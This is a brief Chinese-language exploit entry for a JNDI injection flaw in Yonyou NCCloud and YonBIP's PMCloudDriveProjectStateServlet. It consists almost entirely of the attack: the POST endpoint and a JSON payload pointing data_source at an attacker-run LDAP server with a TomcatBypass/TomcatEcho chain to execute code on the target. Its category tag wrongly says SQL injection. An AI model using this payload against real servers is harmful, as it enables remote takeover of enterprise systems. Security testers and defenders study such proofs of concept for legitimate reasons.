# 用友NCCloud及YonBIPPMCloudDriveProjectStateServlet存在JNDI注入漏洞

用友 ｜ SQL注入 ｜ —
- **请求**：`POST /service/~pim/PMCloudDriveProjectStateServlet HTTP/1.1`

**Payload**
```
"data_source":"ldap://vpsip:1389/TomcatBypass/TomcatEcho",
"user":""
}
```